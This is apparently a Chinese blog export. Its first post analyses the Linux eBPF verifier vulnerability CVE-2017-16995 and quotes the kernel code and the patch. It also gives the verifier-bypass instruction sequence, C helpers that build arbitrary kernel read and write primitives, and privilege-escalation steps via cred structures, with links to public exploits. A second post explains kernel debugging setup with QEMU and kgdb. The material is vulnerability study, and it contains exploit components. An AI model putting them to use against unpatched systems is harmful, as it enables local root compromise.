漏洞原理首先我们来看检查时的模拟执行是怎么解释这段代码的，当我们调用系统调用__NR_bpf并且cmd为BPF_PROG_LOAD时，就会将attr结构体中的insns成员指向的bpf指令传入到内核，内核会调用do_check函数对传入的指令做安全检查。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116调用链: SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) ---&gt; bpf_prog_load(&amp;attr) ---&gt; bpf_check(&amp;prog,attr) ---&gt; do_check(env)static int do_check(struct verifier_env *env)&#123; struct verifier_state *state = &amp;env-&gt;cur_state; struct bpf_insn *insns = env-&gt;prog-&gt;insnsi; struct reg_state *regs = state-&gt;regs; int insn_cnt = env-&gt;prog-&gt;len; int insn_idx, prev_insn_idx = 0; int insn_processed = 0; bool do_print_state = false; init_reg_state(regs); insn_idx = 0; for (;;) &#123; /* 一个大循环,解析用户态传入的每条指令 */ struct bpf_insn *insn; /* 指令结构体指针 */ u8 class; int err; if (insn_idx &gt;= insn_cnt) &#123; /* 如果循环计数insn_idx大于或等于bpf程序的长度 就退出 */ verbose(\"invalid insn idx %d insn_cnt %d\\n\",insn_idx, insn_cnt); return -EFAULT; &#125; insn = &amp;insns[insn_idx]; /* 遍历每条bpf指令 */ class = BPF_CLASS(insn-&gt;code); /* 获取该条指令的class */ if (++insn_processed &gt; 32768) &#123; /* 判断解析指令条数是否大于 32768 */ verbose(\"BPF program is too large. Proccessed %d insn\\n\",insn_processed); return -E2BIG; &#125; err = is_state_visited(env, insn_idx); if (err &lt; 0) return err; if (err == 1) &#123; /* found equivalent state, can prune the search */ if (log_level) &#123; if (do_print_state) verbose(\"\\nfrom %d to %d: safe\\n\",prev_insn_idx, insn_idx); else verbose(\"%d: safe\\n\", insn_idx); &#125; goto process_bpf_exit; &#125; if (log_level &amp;&amp; do_print_state) &#123; verbose(\"\\nfrom %d to %d:\", prev_insn_idx, insn_idx); print_verifier_state(env); do_print_state = false; &#125; if (log_level) &#123; verbose(\"%d: \", insn_idx); print_bpf_insn(insn); &#125; /* 开始解析opcode的class部分 判断指令是否等于 BPF_ALU || BPF_ALU64*/ if (class == BPF_ALU || class == BPF_ALU64) &#123; err = check_alu_op(env, insn); if (err) return err; &#125; else if (class == BPF_LDX) &#123; [...] &#125; else if (class == BPF_STX) &#123; [...] &#125; else if (class == BPF_ST) &#123; [...] &#125; else if (class == BPF_JMP) &#123; u8 opcode = BPF_OP(insn-&gt;code); if (opcode == BPF_CALL) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;off != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_CALL uses reserved fields\\n\"); return -EINVAL; &#125; err = check_call(env, insn-&gt;imm); if (err) return err; &#125; else if (opcode == BPF_JA) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_JA uses reserved fields\\n\"); return -EINVAL; &#125; insn_idx += insn-&gt;off + 1; continue; &#125; else if (opcode == BPF_EXIT) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_EXIT uses reserved fields\\n\"); return -EINVAL; &#125; err = check_reg_arg(regs, BPF_REG_0, SRC_OP); if (err) return err; if (is_pointer_value(env, BPF_REG_0)) &#123; [...] &#125;process_bpf_exit: insn_idx = pop_stack(env, &amp;prev_insn_idx); /* 弹出保存在临时栈中的分支 */ if (insn_idx &lt; 0) &#123; break; &#125; else &#123; do_print_state = true; continue; &#125; &#125; else &#123; err = check_cond_jmp_op(env, insn, &amp;insn_idx); if (err) return err; &#125; &#125; else if (class == BPF_LD) &#123; [...] &#125; else &#123; verbose(\"unknown insn class %d\\n\", class); return -EINVAL; &#125; insn_idx++; /* 循环计数 */ &#125; 我们主要关注2个class,分别是BPF_ALU与BPF_JMP先看BPF_ALU,实际逻辑在check_alu_op函数中12345678910111213141516171819202122232425262728293031323334353637383940if (class == BPF_ALU || class == BPF_ALU64) &#123; err = check_alu_op(env, insn); if (err) return err;/* check validity of 32-bit and 64-bit arithmetic operations */static int check_alu_op(struct verifier_env *env, struct bpf_insn *insn)&#123; struct reg_state *regs = env-&gt;cur_state.regs; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode == BPF_END || opcode == BPF_NEG) &#123; [...] &#125; else if (opcode == BPF_MOV) &#123; /* opcode == BPF_MOV */ if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; /* 判断源寄存器是否存在 跳过*/ [...] &#125; else &#123; /* 因为我们MOV使用的立即数,所以进入 */ if (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != 0) &#123; verbose(\"BPF_MOV uses reserved fields\\n\"); return -EINVAL; &#125; &#125; /* check dest operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); if (err) return err; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; /* 判断源寄存器是否存在 跳过*/ [...] &#125; else &#123; /* 立即数,进入 */ /* case: R = imm * remember the value we stored into this reg */ regs[insn-&gt;dst_reg].type = CONST_IMM; /* CONST_IMM = 8 */ regs[insn-&gt;dst_reg].imm = insn-&gt;imm; /* insn-&gt;imm:0xffffffff 对regs[insn-&gt;dst_reg].imm进行赋值,注意这里的regs[insn-&gt;dst_reg].imm与insn-&gt;imm都是有符号32位*/ &#125; &#125; else if (opcode &gt; BPF_END) &#123; [...] &#125; else &#123; /* all other ALU ops: and, sub, xor, add, ... */ [...] &#125; return 0;&#125; 通过BPF_OP获取指令的opcode,这条指令的opcode是MOV,并且使用的是BPF_K,也就是立即数,所以最终把CONST_IMM赋值给regs[insn-&gt;dst_reg].type,把insn-&gt;imm(0xffffffff)赋值给regs[insn-&gt;dst_reg].imm,注意:这里需要留意的一点是insn-&gt;imm和regs[insn-&gt;dst_reg].imm都属于有符号32位。123456789101112131415struct bpf_insn&#123; __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */&#125;struct reg_state &#123; enum bpf_reg_type type; union &#123; int imm; /* regs[BPF_REG_2].imm */ struct bpf_map *map_ptr; &#125;;&#125;; 接着再来看对BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)的解析,主要在check_cond_jmp_op函数中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&#125; else &#123; err = check_cond_jmp_op(env, insn, &amp;insn_idx); if (err) return err; &#125;static int check_cond_jmp_op(struct verifier_env *env, /* 该函数主要处理条件分支 */ struct bpf_insn *insn, int *insn_idx)&#123; struct reg_state *regs = env-&gt;cur_state.regs; struct verifier_state *other_branch; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode &gt; BPF_EXIT) &#123; verbose(&quot;invalid BPF_JMP opcode %x\\n&quot;, opcode); return -EINVAL; &#125; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; if (insn-&gt;imm != 0) &#123; verbose(&quot;BPF_JMP uses reserved fields\\n&quot;); return -EINVAL; &#125; /* check src1 operand */ err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err; if (is_pointer_value(env, insn-&gt;src_reg)) &#123; verbose(&quot;R%d pointer comparison prohibited\\n&quot;, insn-&gt;src_reg); return -EACCES; &#125; &#125; else &#123; if (insn-&gt;src_reg != BPF_REG_0) &#123; verbose(&quot;BPF_JMP uses reserved fields\\n&quot;); return -EINVAL; &#125; &#125; /* check src2 operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP); if (err) return err; /* detect if R == 0 where R was initialized to zero earlier */ if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp; /* 如果目标类型属于立即数 并且 目标的立即数与需要判断的立即数一致 那么直接进入恒等模式 只追随满足条件的分支*/ regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123; if (opcode == BPF_JEQ) &#123; /* if (imm == imm) goto pc+off; * only follow the goto, ignore fall-through */ *insn_idx += insn-&gt;off; return 0; &#125; else &#123; /* */ /* if (imm != imm) goto pc+off; * only follow fall-through branch, since * that&apos;s where the program will go */ return 0; &#125; &#125; other_branch = push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx); /* 若当前比较不属于立即数比较,则会把第二条分支临时保存起来 后续若遇到exit指令 就pop出来第二条分支进行模拟执行 */ if (!other_branch) return -EFAULT; /* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */ if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; insn-&gt;imm == 0 &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123; if (opcode == BPF_JEQ) &#123; /* next fallthrough insn can access memory via * this register */ regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; /* branch targer cannot access it, since reg == 0 */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = 0; &#125; else &#123; other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = 0; &#125; &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123; verbose(&quot;R%d pointer comparison prohibited\\n&quot;, insn-&gt;dst_reg); return -EACCES; &#125; else if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123; if (opcode == BPF_JEQ) &#123; /* detect if (R == imm) goto * and in the target state recognize that R = imm */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; else &#123; /* detect if (R != imm) goto * and in the fall-through state recognize that R = imm */ regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; &#125; if (log_level) print_verifier_state(env); return 0;&#125; check_cond_jmp_op函数主要用来处理分支语句(BPF_JEQ,BPF_JNE),但是因为这里是立即数之间做比较,如果两个立即数相等就会进入恒等情况,直接退出check_cond_jmp_op函数,因为内核认为这是恒等情况永远都会成立,所以也就没有执行保存分支2到临时栈中的代码(push_stack函数),如果我们在条件成立的情况下接着执行BPF_JMP|BPF_EXIT指令,那么内核就会直接跳出大循环,结束安全检查。看看do_check中BPF_EXIT指令的处理代码1234567891011121314151617181920212223242526272829303132333435363738394041424344else if (opcode == BPF_EXIT) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_EXIT uses reserved fields\\n\"); return -EINVAL; &#125; /* eBPF calling convetion is such that R0 is used * to return the value from eBPF program. * Make sure that it's readable at this time * of bpf_exit, which means that program wrote * something into it earlier */ err = check_reg_arg(regs, BPF_REG_0, SRC_OP); if (err) return err; if (is_pointer_value(env, BPF_REG_0)) &#123; verbose(\"R0 leaks addr as return value\\n\"); return -EACCES; &#125;process_bpf_exit: insn_idx = pop_stack(env, &amp;prev_insn_idx); /* 弹出保存在临时栈中的分支 */ if (insn_idx &lt; 0) &#123; /* 如果pop_stack返回值小于0 */ break; /* 跳出大循环 */ &#125; else &#123; do_print_state = true; /* 否则设置状态为true 检查分支2*/ continue; /* 并结束本次循环 */ &#125;static int pop_stack(struct verifier_env *env, int *prev_insn_idx)&#123; /* 弹出临时栈中的分支 */ struct verifier_stack_elem *elem; int insn_idx; if (env-&gt;head == NULL) /* 若env-&gt;head为空,那么返回-1 */ return -1; memcpy(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, sizeof(env-&gt;cur_state)); insn_idx = env-&gt;head-&gt;insn_idx; if (prev_insn_idx) *prev_insn_idx = env-&gt;head-&gt;prev_insn_idx; elem = env-&gt;head-&gt;next; kfree(env-&gt;head); env-&gt;head = elem; env-&gt;stack_size--; return insn_idx;&#125; 因为前面JNE判断语句结果为恒等,所以并没有对分支2进行入栈备份,导致在执行BPF_EXIT操作后,内核打算执行pop_stack函数来获取分支2时env-&gt;head为空,所以返回-1,而又因为pop_stack的返回值为-1,内核以为代码检查完毕了,所以直接执行break退出了for大循环,结束了对用户指令的检查操作。所以内核在模拟执行时只检查了4条代码就退出了检查。12345#define BPF_DISABLE_VERIFIER() \\ BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF), /* r2 = (u32)0xFFFFFFFF */ \\ BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), /* if (r2 == -1) &#123; */ \\ BPF_MOV64_IMM(BPF_REG_0, 0), /* exit(0); */ \\ BPF_EXIT_INSN() /* &#125; */ \\ 然后再来看实际执行的情况：1实际执行调用链：__vfs_write -&gt; new_sync_write -&gt; sock_write_iter -&gt; sock_sendmsg -&gt; sock_sendmsg_nosec -&gt; unix_dgram_sendmsg -&gt; sk_filter -&gt; bpf_prog_run_save_cb -&gt; __bpf_prog_run 函数__bpf_prog_run用做实际解析并执行指令,该函数中有一个大的跳转表(jumptable),通过把每条指令的insn-&gt;code成员作为跳转表的索引值,跳转到需要执行的分支处对不同的指令做处理12select_insn: goto *jumptable[insn-&gt;code]; 我们主要关注的是以下两条分支,对应着用户层传入的前两条指令12[BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K, 123ALU_MOV_K: DST = (u32) IMM; /*#define DST regs[insn-&gt;dst_reg] ; #define IMM insn-&gt;imm */ CONT; 实际解析BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)指令时会把有符号32位的IMM(insn-&gt;imm)强转为无符号32型,并赋值给无符号64位的DST(regs[insn-&gt;dst_reg]),所以此时DST==0x00000000FFFFFFFF123456JMP_JNE_K: /* 判断当前指令立即数是否与目标寄存器一致 */ if (DST != IMM) &#123; /* 因为DST在上条指令被赋值为了u32类型的0x00000000FFFFFFFF,而本次IMM在比较时会被扩展为无符号64位的0xFFFFFFFFFFFFFFFF,所以比较肯定不一致 */ insn += insn-&gt;off; /* 当前指令 + 当前指令的偏移参数 = 下条需要执行指令的位置 */ CONT_JMP; /* #define CONT_JMP (&#123; insn++; goto select_insn; &#125;) */ &#125; CONT; 在解析BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)指令时,因为DST属于无符号64位类型,比较时会把有符号32位的IMM(insn-&gt;imm)隐式转为无符号64位(0xFFFFFFFFFFFFFFFF),而DST最开始被赋值为0x00000000FFFFFFFF所以比较的结果肯定是不相等分析到这里我们可以看出模拟执行时JNE比较结果为恒等,而实际执行是JNE比较结果却为不等,因为实际执行的结果不等,所以会跳过两条指令继续执行,而分支2的指令在模拟执行时是没有被检查的,所以我们可以把分支2构造为我们用来提权的代码,这样就绕过了内核的安全检查,执行任何我们想执行的代码了。 补丁用意123456789101112131415161718diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 625e358..c086010 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -2408,7 +2408,13 @@ static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)* remember the value we stored into this reg*/ regs[insn-&gt;dst_reg].type = SCALAR_VALUE;- __mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);+ if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;+ __mark_reg_known(regs + insn-&gt;dst_reg,+ insn-&gt;imm);+ &#125; else &#123;+ __mark_reg_known(regs + insn-&gt;dst_reg,+ (u32)insn-&gt;imm);+ &#125; &#125; &#125; else if (opcode &gt; BPF_END) &#123; 添加了对bpf指令目标位数的检查，避免64位与32位的混淆比较。 漏洞利用基础知识使用bpf的流程：调用syscall（NR_bpf，BPF_MAP_CREATE，&amp;attr，size(attr)）申请一个map，在attr结构体中指定map的类型，大小，最大兼容等级。调用syscall（NR_bpf，BPF_PROG_LOAD,&amp;attr，sizeof（attr）），将用户态的BPF指令加载到内核态，attr包含指令数量，指令首地址，日志等级。内核态在实际执行这些指令之前会先利用虚拟执行的方式做安全校验，如果安全校验通过后，指令被成功加载到内核，然后实际执行。使用setsockopt（sockets。SO_SOCKET，SO_ATTACK_BPF，&amp;progfd，sizeof（progfd））把BPF句柄绑定到指定的socket上，Progfd为第二步的返回值。最后通过操作第三步的socket来触发BPF实际执行。write(sockets[0], buffer, sizeof(buffer)) 利用思路构造读写原语现在我们已经能够给内核注入代码了，但我们需要怎么去提权呢？也就是注入的代码该怎么写呢？这里就涉及到了我们前面说过的bpf的数据共享，通过BPF_MAP_CREATE选项在内核中创建一个映射表，因为该映射表是内核层与应用层共享的所以我们可以通过在用户层修改该映射表中的数据从而控制内核中bpf被执行的代码。大概思路如下:首先通过BPF_MAP_CREATE选项创建一个map映射表并设置该map可存放的最大元素个数为3，分别表示操作指令(op)，读写地址(address)，读写值(value)。这个映射表就组成了一条控制指令。接着利用BPF_PROG_LOAD选项加载我们精心构造的bpf规则指令到内核。最后使用setsockopt函数的SO_ATTACK_BPF选项绑定精心构造的bpf规则指令到套接字。现在我们只要对套接字进行写操作就能触发我们注入到内核的bpf指令。bpf指令伪代码如下：1234567891011op = get_map(key=0)address = get_map(key=1) value = get_map(key=2)if (op == 0) get_map(key=2) = fpelse if (op == 1) get_map(key=2) = skbuffelse if (op == 2) get_map(key=2) = read(address)else write(address,value) bpf系统调用的BPF_MAP_LOOKUP_ELEM选项用来获取映射表指定key的值，我们封装为任意读，123456789101112131415int bpf_lookup_elem(int fd, void *key, void *value)&#123; union bpf_attr attr = &#123; .map_fd = fd, .key = ptr_to_u64(key), .value = ptr_to_u64(value), &#125;; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static unsigned long get_value(int key) &#123; unsigned long value; if (bpf_lookup_elem(mapfd, &amp;key, &amp;value)) &#123; /* 根据传入的key获取value */ fail(\"bpf_lookup_elem failed '%s'\\n\", strerror(errno)); &#125; return value;&#125; BPF_MAP_UPDATE_ELEM选项用来更新指定key的值，我们用来实现任意写。1234567891011121314int bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)&#123; union bpf_attr attr = &#123; .map_fd = fd, .key = ptr_to_u64(key), .value = ptr_to_u64(value), .flags = flags, &#125;; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr)); /* 根据传入的key设置value的值 */&#125;static void update_elem(int key, unsigned long value) &#123; if (bpf_update_elem(mapfd, &amp;key, &amp;value, 0)) &#123; fail(\"bpf_update_elem failed '%s'\\n\", strerror(errno)); &#125;&#125; write(sockets[0], buffer, sizeof(buffer))用作触发bpf规则的实际执行。12345678 /* 封装的任意读写 cc控制 */static unsigned long sendcmd(unsigned long op, unsigned long addr, unsigned long value) &#123; update_elem(0, op); /* 修改map元素0中的value为指定的op指令*/ update_elem(1, addr); /* 修改map元素1中的value为需要读/写的内核地址*/ update_elem(2, value); /* 修改map元素2中的value为需要写入的值*/ writemsg(); /* 触发bpf程序实际执行 */ return get_value(2); /* 获取map元素2中的value值 */&#125; 因为这个漏洞可以重复触发，所以只需要把上面的函数做一下封装，就可以组成任意读写的原语，通过控制op参数的值促使内核做不同的读写操作：123456789101112131415unsigned long get_skbuff() &#123; /* 封装 直接获取绑定socket的skbuff地址 */ return sendcmd(1, 0, 0); /* op = 1：获取skbuff的值，addr=0，value=0，返回值为skbuff的地址 */&#125;unsigned long get_fp() &#123; /* 封装 直接获取栈帧 */ return sendcmd(0, 0, 0); /* op = 0：获取内核栈帧，addr=0，value=0，返回值为内核栈帧 */&#125;unsigned long read64(unsigned long addr) &#123; /* 封装内核读 */ return sendcmd(2, addr, 0); /* op = 2：执行读操作，addr：需要读的内核地址，返回值为读取的值 */&#125;void write64(unsigned long addr, unsigned long val) &#123; /* 封装内核写 */ (void)sendcmd(3, addr, val); /* op = 3：执行写操作，addr：需要写的内核地址，value：需要写的值 */&#125; 在我们拥有了任意读写原语之后我们就可以来提权了，常规的提权方式这里有两种： 泄漏fp第一种首先通过我们封装的get_fp来获取当前进程的栈地址，然后通过经典的 栈地址 &amp; ~(0x4000-1)计算出当前进程的thread_info结构体的起始地址，接着通过任意读获取task_struct结构体，有了task_struct结构体之后我们就可以通过偏移量去修改cred结构体实现提权了。 12345678910111213141516171819202122232425262728293031323334353637struct thread_info &#123; struct pcb_struct pcb; struct task_struct *task; unsigned int flags; unsigned int ieee_state; struct exec_domain *exec_domain; mm_segment_t addr_limit; unsigned cpu; [….] struct restart_block restart_block;&#125;;/-------------------------------------------------------------/struct task_struct &#123; volatile long state; void *stack; atomic_t usage; unsigned int flags; unsigned int ptrace; [...] struct list_head cpu_timers[3]; const struct cred *real_cred; const struct cred *cred; char comm[TASK_COMM_LEN]; […]&#125;/-------------------------------------------------------------/struct cred &#123; atomic_t usage; kuid_t uid; kgid_t gid; kuid_t suid; kgid_t sgid; kuid_t euid; kgid_t egid; [...] struct rcu_head rcu;&#125;; 泄漏skbuff第二种是通过获取当前套接字的sk_buff遍历当前进程的cred结构体，sk_buff变量中有一个sk元素(struct sock *sk)，而sk元素又包含当前进程的cred结构体，所有通过sk_buff变量也能获取到当前进程的cred结构体实现内核提权。1234567891011121314151617181920212223242526272829303132333435sk_buff的获取可以通过对fp做加减获得sk_buff-&gt;sk-&gt;sk_peer_cred &lt;&lt; cred结构体/-------------------------------------------------------------/struct sk_buff &#123; struct sk_buff *next; struct sk_buff *prev; union &#123; ktime_t tstamp; struct skb_mstamp skb_mstamp; &#125;; struct sock *sk; struct net_device *dev; [...]&#125;/-------------------------------------------------------------/struct sock &#123; [...] struct pid *sk_peer_pid; const struct cred *sk_peer_cred; long sk_rcvtimeo; long sk_sndtimeo; [...]&#125;;/-------------------------------------------------------------/struct cred &#123; atomic_t usage; kuid_t uid; kgid_t gid; kuid_t suid; kgid_t sgid; kuid_t euid; kgid_t egid; [...] struct rcu_head rcu;&#125;; 总结 感觉这个漏洞还挺有趣，第一次接触这类漏洞，通过传入精心构造的数据控制程序的执行流程，让内核直接执行我们传入的代码，利用起来也特别稳定还非常好理解而且由于都是正常操作，所以直接绕过了内核对于漏洞利用的缓解机制，完全不像哪些容易造成系统崩溃的破坏内存的漏洞。 跟着exp分析了下该漏洞，并做一下记录，不断努力，多找一些exploit，跟着作者的思路一步一步的分析，思考作者当时的想法，不断积累漏洞利用经验。 触发该漏洞需要两个条件：12Kernel编译选项CONFIG_BPF_SYSCALL打开，启用了bpf syscall；/proc/sys/unprivileged_bpf_disabled设置为0，允许非特权用户调用bpf_syscall； 参考123456https://www.csdn.net/gather_2d/MtjaQg2sMzIwMy1ibG9n.htmlhttps://blog.csdn.net/ljy1988123/article/details/50444693最初的exphttps://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.chttps://github.com/dangokyo/CVE_2017_16995https://github.com/rlarabee/exploits/tree/master/cve-2017-16995","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Linux_Kernel","slug":"Linux-Kernel","permalink":"http://github.com/tags/Linux-Kernel/"}]},{"title":"linux内核调试环境搭建","slug":"linux内核调试环境搭建","date":"2018-04-30T13:28:02.000Z","updated":"2018-08-26T10:39:39.806Z","comments":true,"path":"2018/04/30/linux内核调试环境搭建/","link":"","permalink":"http://github.com/2018/04/30/linux内核调试环境搭建/","excerpt":"","text":"linux内核调试环境搭建 内核下载首先因为我们要调试内核,所以需要自己编译内核先去https://www.kernel.org/,下载一个合适的内核源码包并解压出来，然后cd到该内核源码的根目录下。 内核编译配置.config文件通过执行make menuconfig命令生成.config配置文件可能会出现以下的错误,这是因为最小系统不支持图形的原因,安装libncurses5-dev后即可 解决方法： 下载libncurses5源码包,编译,安装,相对比较麻烦 sudo apt-get update(更新系统源) sudo apt-get install libncurs*(安装依赖文件) make menuconfig命令执行成功,可以看到成功弹出了配置勾选界面勾选以下选项:不同内核版本选项的位置可能会不同勾选以下选项：取消以下选项：取消该选项后就可以在内核地址上就行写操作了,如果该选项被选中的话,那么gdb将无法下断点!(提示:invalid address错误) 快捷键： y勾选,n取消勾选, enter进入子菜单界面 按两次esc回退到父菜单界面 编译参数设置完毕，保存完成后会生成一个.config文件，保存在内核源码跟目录下，系统会依据该配置文件来生成内核镜像 生成bzImage文件 make -j8 make命令包含下列的命令: 1. 确定依赖项：make dep 2. 清理编译之间文件：make clean 3. 编译内核生成bzImage文件：make bzImage 4. 编译模块生成模块文件：make module make命令执行完毕后就会生成一个bzImage文件和一个vmlinux文件 - bzImage就是内核镜像 - vmlinux就是gdb源码调试所需的文件 把这两个文件拷贝到一个空目录,方便管理 生成initrd.img文件 make module_install //该命令会在/lib/modules/ 目录下生成制作initrd.img所需的文件 3.18.47是上面的命令生成的文件夹 4.4.0-31-generic是本机原始内核的(不用关注) 使用以下命令生成initrd.img文件 mkinitramfs /lib/modules/3.18.47 -o ./initrd.img该命令会在当前目录下生成initrd.img文件,生成完毕后把它拷贝到内核镜像同一个目录下 如果一切顺利的话，我们有了以下几个文件，现在就可以进行下一步了 方案1：qemu调试qemu安装通过apt-get即可安装，也可以到官网去下载源码进行安装:https://www.qemu.org/download/apt-get install qemu qemu启动内核因为我们编译的是64位的内核,使用我们使用qemu-system-x86_64对内核进行启动启动命令：qemu-system-x86_64 -kernel ./bzImage -initrd ./initrd.img -smp 2 -gdb tcp::1234 -S -kernel：自定义内核的路径 -initrd：initrd.img的路径 -smp：cpu核数 -gdb tcp:1234：启动qemu内置的gdbserver,开启gdb调试端口 -S：挂起,等待gdb服务端连接调试注意命令中文件路径 gdb连接调试使用gdb载入编译内核时生成的vmlinux达到源码调试gdb [路径]/vmlinux //载入内核对应的vmlinux文件 载入vmlinux成功后,通过target remote localhost:1234就可以连接上qemu中被挂起的linux,达到内核调试的效果不过我这gdb存在问题，在网上找的解决方法说需要修改gdb源码，试了下也没解决，不过别的小伙伴却可以，可能是系统环境的原因吧 方案2：双机调试更新本机内核我们把内核和所需模块编译好之后通过下面的命令安装到本机make modules_install //安装编译出来的modules到本机make install //安装编译出来的内核到本机 命令执行完毕后可以看到/boot目录下新生成了几个文件，内核更新到了我们编译的版本，说明我们内核编译成功了关机重启，验证一下，虚拟机再启动是通过按住ESC键就可进入grub选项enter进入，可以看到当前系统安装的内核，我们选择新安装的内核3.18.47启动发现启动起来了只有一个小黑窗，这并不是我想要的，不过可以看到内核确实是更新成功了遇到这种问题，可能因为本机是4.x的，而新编译的是3.x的不兼容，不能直接进入图形界面吧，然后又在官网上找了一个4.4.1的内核，下载下来编译通过，安装内核到本机，再次启动看能否进入图形界面。进入grub，选择4.4.1的内核启动（好像linux自己会选择最新的内核版本启动）还好还好，终于是进来了，继续入坑验证成功后，关闭虚拟机 配置双机通信因为我们使用双机调试，需要一个客户机和一个目标机，因为在WMware中搭建，所以可以直接克隆一份当前的环境用作目标机，这里我选择的是完全克隆，链接克隆没试过然后给两台机器配置通信，这里采用串口通信，需要注意的是，在安装虚拟机的时候会默认安装时并口，但是没有串口，所以我们需要先将并口删除（在虚拟机设置中移除打印机），然后添加串口，并按照图中显示配置串口客户机:目标机:这里需要注意的是客户技设置的是该端为客户端,而目标机设置的是该端为服务端 验证通信两台机器的串口端口配置完毕后就来验证一下是否能够通信吧让他们都飞起来吧，启动完毕后在一段向串口输入数据，另一端接收数据。接收端(在这过程中接收数据端需要先打开接收，然后再让发送端发送):发送端:验证成功，能够正常通信 配置串口调试上面的配置完成之后，就相当于在两台虚拟机之间连了一根串口线，如果想让两个系统之间通过出口线调试，那么还需要配置串口调试模式 客户机调试配置通过gedit /etc/default/grub打开文件，搜索关键字，备份一下，修改内容修改完毕后，通过update-grub命令更新grub，让配置生效这样grub就完成了更新,重启设备后就会加载串口通信，grub更新配置后,会自动修改/boot/grub/grub.cfg文件 目标机调试配置目标机也是修改相同的文件，不过这里多了一个参数”text”，这个参数的意思是系统启动后以text界面启动，而不是以图形界面显示（这个不是必须的，看个人吧）修改完毕后更新grub:update-grub，更新完毕后我们需要手动修改/boot/grub/grub.cfg文件，添加等待调试的启动选项通过复制一份启动选项,把”Ubuntu, with Linux 4.4.1”修改为”Ubuntu, with Linux 4.4.1—wait”,并且在新添加的启动选项中再添加一个kgdbwait选项(为了在系统刚启动时可以进入调试模式) gdb连接调试配置设置完成，启动验证选中启动，目标机进行等待状态可以看到目标机已经进入等待远程调试状态,此时我们在客户端使用gdb调试器连接试试gdb连接成功了当系统启动后可以使用以下命令让系统进入调试模式,让gdb再次附加,下断调试echo g &gt; /proc/sysrq-trigger //进入调试模式b start_kernel //在内核开始处下断 总结搭建环境就是麻烦，遇到各种奇怪的问题，可气的的是同样的方式搭建别人可以，我这就出错，应该是环境的问题吧。不管怎么说，至少最后能调试了。qemu调试：感觉这种调试方法挺方便的，可惜我gdb总是出现问题，唉双机调试：使用双机调试的话 